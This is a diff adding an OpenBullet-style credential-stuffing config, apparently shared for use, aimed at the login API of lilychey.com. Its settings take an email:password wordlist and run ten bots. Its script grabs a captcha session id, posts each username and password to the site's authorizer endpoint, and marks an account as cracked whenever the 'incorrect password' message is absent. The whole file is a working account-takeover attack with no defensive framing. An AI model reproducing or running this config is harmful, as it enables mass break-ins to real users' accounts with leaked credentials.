@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "LilyChey",
+  "SuggestedBots": 10,
+  "LastModified": "2018-05-23T14:11:48.8799485+00:00",
+  "AdditionalInfo": "Best Girl",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://lilychey.com/api/captcha.genId?_method=captcha.genId&alias=autumnNew" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+PARSE "<SOURCE>" JSON "sid" Recursive=FALSE -> VAR "SID" "" "" 
+REQUEST POST "https://lilychey.com/api/site.authorizer.auth" AutoRedirect=TRUE 
+  CONTENT "_method=site.authorizer.auth&memberFields[0]=login&captchaId=autumnNew:<SID>&le=<USER>&password=<PASS>&params={\"_method\":\"site.authorizer.auth\",\"memberFields\":[\"login\"],\"captchaId\":\"autumnNew:<SID>\",\"le\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://lilychey.com" 
+  HEADER "referer: https://lilychey.com/login" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "The login or password entered is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "The login or password entered is incorrect" 
